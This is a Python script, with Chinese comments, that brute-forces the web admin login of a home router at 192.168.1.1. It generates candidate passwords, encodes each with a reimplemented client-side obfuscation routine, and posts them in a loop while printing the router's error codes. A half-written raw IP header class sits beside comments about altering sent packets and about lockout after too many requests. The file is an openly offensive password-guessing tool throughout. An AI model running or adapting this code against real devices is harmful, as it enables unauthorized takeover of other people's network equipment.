import socket
import struct
from multiprocessing import Queue
import requests
import json
import itertools as its
import threading



words = "1234568790"


#待定
#如何修改发送的ip报文
#请求次数过多，会被锁定

class ip(object):
    def __init__(self, source, destination):
        self.version = 4
        self.ihl = 5 # Internet Header Length
        self.tos = 0 # Type of Service
        self.tl = 0 # total length will be filled by kernel
        self.id = 54321
        self.flags = 0 # More fragments
        self.offset = 0
        self.ttl = 255
        self.protocol = socket.IPPROTO_TCP
        self.checksum = 0 # will be filled by kernel
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)
    def pack(self):
        ver_ihl = (self.version << 4) + self.ihl
        flags_offset = (self.flags << 13) + self.offset
        ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)


# 创建密码线程

class CreatePsdThread(threading.Thread):
    def __init__(self, name,queue):
        threading.Thread.__init__(self, name=name)
        self.data = queue
        self.r = its.product(words, repeat=1)
    def run(self):
        for i in self.r:
            self.data.put("".join(i))


# 请求线程
class SendThread(threading.Thread):
    def __init__(self, name,queue,code):
        threading.Thread.__init__(self, name=name)
        self.data = queue
        self.url = 'http://192.168.1.1/'
        self.headers = {'content-type': 'application/json','host':'192.168.1.153'}
        self.code=code
    def run(self):
        while True:
            if not self.data.empty():
                pwd = self.data.get()
                payload = {"method": "do", "login": {"password": securityEncode(pwd)}}
                r = requests.post(self.url, data=json.dumps(payload), headers=self.headers)
                data_json = json.loads(r.content.decode('utf8'))
                print(pwd+'  >>>>  '+ self.code[str(data_json['data']['code'])])


#错误码

def geterrorcode():
    file = open('errorcode.txt', 'r', encoding='utf-8')
    lines = file.readlines()
    code = {}
    for line in lines:
        data = str(line).split(' ')
        code[data[0]] = data[1][0:-1]
    return code


#加密

def securityEncode(password):
        input1 =  "RDpbLfCPsJZ7fiv"
        input3 = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciX" \
      "TysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgML" \
      "wygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3"\
      "sfQ1xtXcPcf1aT303wAQhv66qzW"

        dictionary = input3
        output = ""

        cl = 0xBB
        cr = 0xBB

        len1 = input1.__len__()
        len2 = password.__len__()
        lenDict = dictionary.__len__()
        len = 0
        if len1>len2:
            len = len1
        else:
            len = len2

        for index in range(len):
            cl = 0xBB
            cr = 0xBB

            if index >= len1:
                cr = ord(password[index])

            elif index >= len2:
                cl = ord(input1[index])

            else:
                cl = ord(input1[index])
                cr = ord(password[index])

            output += dictionary[((cl ^ cr)%lenDict)]

        return output

if __name__ == '__main__':

    code = geterrorcode()
    que = Queue()

    createpsd = CreatePsdThread('CreateThread',que)
    createpsd.start()

    send = SendThread('SendThread', que,code)
    send.start()